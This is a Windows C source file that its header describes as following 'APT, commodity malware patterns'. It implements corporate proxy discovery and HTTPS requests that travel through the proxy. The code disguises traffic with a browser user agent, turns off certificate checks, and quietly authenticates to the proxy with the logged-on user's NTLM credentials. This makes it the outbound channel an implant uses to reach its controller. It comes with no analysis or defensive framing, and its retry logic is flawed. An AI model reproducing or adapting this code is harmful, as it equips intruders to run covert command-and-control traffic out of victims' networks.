/*
 * Proxy Awareness - Corporate proxy detection
 * APT, commodity malware patterns
 */

#include <windows.h>
#include <winhttp.h>
#include <wininet.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")

// ============================================================================
// CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD type;       // 0=direct, 1=http, 2=socks4, 3=socks5
    WCHAR host[128];
    WORD  port;
    WCHAR user[64];
    WCHAR pass[64];
} PROXY_INFO;
#pragma pack(pop)

// ============================================================================
// REGISTRY DETECTION
// ============================================================================

BOOL proxy_reg(char* out, int maxlen)
{
    HKEY hk;
    DWORD type, sz = maxlen, enabled = 0;

    if(RegOpenKeyExA(0x80000001,  // HKEY_CURRENT_USER
        "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
        0, 0x20019, &hk) != 0)  // KEY_READ
        return 0;

    sz = sizeof(enabled);
    RegQueryValueExA(hk, "ProxyEnable", 0, &type, (BYTE*)&enabled, &sz);

    if(!enabled) {
        RegCloseKey(hk);
        return 0;
    }

    sz = maxlen;
    LONG ret = RegQueryValueExA(hk, "ProxyServer", 0, &type, (BYTE*)out, &sz);
    RegCloseKey(hk);

    return (ret == 0);
}

// ============================================================================
// WINHTTP AUTO-DETECT
// ============================================================================

BOOL proxy_wpad(WCHAR* url, WCHAR* proxy, int maxlen)
{
    HINTERNET hS = WinHttpOpen(L"", 1, 0, 0, 0);  // NO_PROXY
    if(!hS) return 0;

    WINHTTP_AUTOPROXY_OPTIONS opts = {0};
    WINHTTP_PROXY_INFO info = {0};

    // WPAD (Web Proxy Auto-Discovery)
    opts.dwFlags = 1;  // WINHTTP_AUTOPROXY_AUTO_DETECT
    opts.dwAutoDetectFlags = 1 | 2;  // DHCP | DNS_A
    opts.fAutoLogonIfChallenged = 1;

    if(WinHttpGetProxyForUrl(hS, url, &opts, &info)) {
        if(info.lpszProxy) {
            int i = 0;
            while(info.lpszProxy[i] && i < maxlen - 1) {
                proxy[i] = info.lpszProxy[i];
                i++;
            }
            proxy[i] = 0;
            GlobalFree(info.lpszProxy);
            if(info.lpszProxyBypass) GlobalFree(info.lpszProxyBypass);
            WinHttpCloseHandle(hS);
            return 1;
        }
    }

    WinHttpCloseHandle(hS);
    return 0;
}

// ============================================================================
// WINHTTP IE PROXY
// ============================================================================

BOOL proxy_ie(WCHAR* proxy, int maxlen)
{
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG cfg = {0};

    if(!WinHttpGetIEProxyConfigForCurrentUser(&cfg))
        return 0;

    BOOL ret = 0;
    if(cfg.lpszProxy) {
        int i = 0;
        while(cfg.lpszProxy[i] && i < maxlen - 1) {
            proxy[i] = cfg.lpszProxy[i];
            i++;
        }
        proxy[i] = 0;
        ret = 1;
        GlobalFree(cfg.lpszProxy);
    }
    if(cfg.lpszProxyBypass) GlobalFree(cfg.lpszProxyBypass);
    if(cfg.lpszAutoConfigUrl) GlobalFree(cfg.lpszAutoConfigUrl);

    return ret;
}

// ============================================================================
// ENVIRONMENT VARIABLE
// ============================================================================

BOOL proxy_env(char* out, int maxlen)
{
    char* vars[] = {"HTTP_PROXY", "http_proxy", "HTTPS_PROXY", "https_proxy", 0};

    for(int i = 0; vars[i]; i++) {
        DWORD len = GetEnvironmentVariableA(vars[i], out, maxlen);
        if(len > 0 && len < maxlen) return 1;
    }
    return 0;
}

// ============================================================================
// PAC URL
// ============================================================================

BOOL proxy_pac(WCHAR* pac_url, int maxlen)
{
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG cfg = {0};

    if(!WinHttpGetIEProxyConfigForCurrentUser(&cfg))
        return 0;

    BOOL ret = 0;
    if(cfg.lpszAutoConfigUrl) {
        int i = 0;
        while(cfg.lpszAutoConfigUrl[i] && i < maxlen - 1) {
            pac_url[i] = cfg.lpszAutoConfigUrl[i];
            i++;
        }
        pac_url[i] = 0;
        ret = 1;
        GlobalFree(cfg.lpszAutoConfigUrl);
    }
    if(cfg.lpszProxy) GlobalFree(cfg.lpszProxy);
    if(cfg.lpszProxyBypass) GlobalFree(cfg.lpszProxyBypass);

    return ret;
}

// ============================================================================
// SMART DETECTION
// ============================================================================

BOOL detect_proxy(WCHAR* target_url, PROXY_INFO* info)
{
    WCHAR wproxy[256] = {0};
    char  aproxy[256] = {0};

    // Method 1: Registry
    if(proxy_reg(aproxy, sizeof(aproxy))) {
        // Parse host:port
        char* colon = 0;
        for(int i = 0; aproxy[i]; i++) {
            if(aproxy[i] == ':') { colon = aproxy + i; break; }
        }
        if(colon) {
            *colon = 0;
            MultiByteToWideChar(0, 0, aproxy, -1, info->host, 128);
            info->port = 0;
            char* p = colon + 1;
            while(*p >= '0' && *p <= '9') {
                info->port = info->port * 10 + (*p++ - '0');
            }
            info->type = 1;  // HTTP
            return 1;
        }
    }

    // Method 2: WinHTTP IE settings
    if(proxy_ie(wproxy, 256)) {
        WCHAR* colon = 0;
        for(int i = 0; wproxy[i]; i++) {
            if(wproxy[i] == ':') { colon = wproxy + i; break; }
        }
        if(colon) {
            *colon = 0;
            int i = 0;
            while(wproxy[i]) { info->host[i] = wproxy[i]; i++; }
            info->host[i] = 0;
            info->port = 0;
            WCHAR* p = colon + 1;
            while(*p >= '0' && *p <= '9') {
                info->port = info->port * 10 + (*p++ - '0');
            }
            info->type = 1;
            return 1;
        }
    }

    // Method 3: WPAD
    if(proxy_wpad(target_url, wproxy, 256)) {
        WCHAR* colon = 0;
        for(int i = 0; wproxy[i]; i++) {
            if(wproxy[i] == ':') { colon = wproxy + i; break; }
        }
        if(colon) {
            *colon = 0;
            int i = 0;
            while(wproxy[i]) { info->host[i] = wproxy[i]; i++; }
            info->host[i] = 0;
            info->port = 0;
            WCHAR* p = colon + 1;
            while(*p >= '0' && *p <= '9') {
                info->port = info->port * 10 + (*p++ - '0');
            }
            info->type = 1;
            return 1;
        }
    }

    info->type = 0;  // Direct
    return 0;
}

// ============================================================================
// HTTP VIA PROXY
// ============================================================================

BOOL http_proxy(WCHAR* proxy, WCHAR* host, WCHAR* uri, BYTE* data, DWORD dlen, BYTE** out, DWORD* olen)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Mozilla/5.0", 3, proxy, L"<local>", 0);  // NAMED_PROXY
    if(!hS) return 0;

    hC = WinHttpConnect(hS, host, 443, 0);
    hR = WinHttpOpenRequest(hC, L"POST", uri, 0, 0, 0, 0x800000);

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

    if(!WinHttpSendRequest(hR, 0, 0, data, dlen, dlen, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *olen = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// PROXY AUTH (BASIC)
// ============================================================================

BOOL http_proxy_auth(WCHAR* proxy, WCHAR* user, WCHAR* pass, WCHAR* host, WCHAR* uri, BYTE** out, DWORD* olen)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Mozilla/5.0", 3, proxy, L"<local>", 0);
    hC = WinHttpConnect(hS, host, 443, 0);
    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, 0x800000);

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

    // First try
    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;

    if(!WinHttpReceiveResponse(hR, 0)) {
        DWORD code = 0, sz = sizeof(code);
        WinHttpQueryHeaders(hR, 0x20000013, 0, &code, &sz, 0);  // STATUS_CODE | FLAG_NUMBER

        if(code == 407) {
            // Set proxy creds
            WinHttpSetCredentials(hR, 1, 1, user, pass, 0);  // PROXY, BASIC

            // Retry
            if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;
            if(!WinHttpReceiveResponse(hR, 0)) goto end;
        }
    }

    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *olen = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// NTLM PROXY AUTH
// ============================================================================

BOOL http_ntlm_proxy(WCHAR* proxy, WCHAR* host, WCHAR* uri, BYTE** out, DWORD* olen)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Mozilla/5.0", 3, proxy, L"<local>", 0);
    hC = WinHttpConnect(hS, host, 443, 0);
    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, 0x800000);

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

retry:
    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;

    if(!WinHttpReceiveResponse(hR, 0)) {
        DWORD code = 0, sz = sizeof(code);
        WinHttpQueryHeaders(hR, 0x20000013, 0, &code, &sz, 0);

        if(code == 407) {
            // NTLM with current user creds
            WinHttpSetCredentials(hR, 1, 2, 0, 0, 0);  // PROXY, NTLM, NULL creds = current user
            goto retry;
        }
    }

    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *olen = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// SMART HTTP REQUEST
// ============================================================================

BOOL smart_http(WCHAR* target_url, WCHAR* host, WCHAR* uri, BYTE* data, DWORD dlen, BYTE** out, DWORD* olen)
{
    PROXY_INFO pi = {0};

    if(detect_proxy(target_url, &pi)) {
        // Build proxy string: host:port
        WCHAR proxy[192];
        int i = 0;
        while(pi.host[i]) { proxy[i] = pi.host[i]; i++; }
        proxy[i++] = ':';
        WORD p = pi.port;
        char tmp[8];
        int j = 0;
        if(p == 0) tmp[j++] = '0';
        else {
            int d = 10000;
            while(d > p) d /= 10;
            while(d) { tmp[j++] = '0' + (p / d) % 10; d /= 10; }
        }
        for(int k = 0; k < j; k++) proxy[i++] = tmp[k];
        proxy[i] = 0;

        // Try NTLM first (common in corporate)
        if(http_ntlm_proxy(proxy, host, uri, out, olen))
            return 1;

        // Try direct via proxy
        return http_proxy(proxy, host, uri, data, dlen, out, olen);
    }

    // Direct connection
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Mozilla/5.0", 0, 0, 0, 0);
    hC = WinHttpConnect(hS, host, 443, 0);
    hR = WinHttpOpenRequest(hC, L"POST", uri, 0, 0, 0, 0x800000);

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

    if(!WinHttpSendRequest(hR, 0, 0, data, dlen, dlen, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *olen = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// EOF
// ============================================================================
